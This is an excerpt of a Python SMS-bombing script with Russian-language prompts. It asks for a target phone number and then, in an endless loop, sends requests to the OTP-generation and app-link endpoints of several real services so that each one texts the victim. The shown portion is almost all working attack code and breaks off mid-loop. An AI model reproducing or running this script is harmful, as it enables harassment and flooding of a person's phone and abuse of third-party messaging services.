...
banner = """
\033[1;77m\033[1;93m ____________________________________________________
|                                                    |
| [--] Name: SMSBomer                                |
|                                                    |
| [--] Have Services: 51                             |
...
print(banner)
_phone = input('\033[1;31mНомер для атаки (79xxxxxxxxx)-->> \033[0m')
...
while True:
	...
	try:
		requests.post('https://textbelt.com/otp/generate', data={
			'phone':'%s' % _phone,
			'userid':'%s' % _email,
        	'message':'LoL KeK (C) 2020 ABT',
        	'key':'textbelt'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
		print("LoL KeK отправлено")
	except:
		print('[-] Не отправлено!')
	try:
		requests.post('https://www.flipkart.com/api/5/user/otp/generate', data={'loginId': "+" + _phone}, headers={'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop', 'Origin': 'https://www.flipkart.com', 'Content-Type': 'application/x-www-form-urlencoded'})
		print('[+] Flipkart отправлено')
	except:
		print('[-] Не отправлено!')
	try:
		requests.post('https://unacademy.com/api/v1/user/get_app_link/', data={'phone_number': _phone}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
		print('[+] UNAcademy отправлено')
	except:
		print('[-] Не отправлено!')
	try:
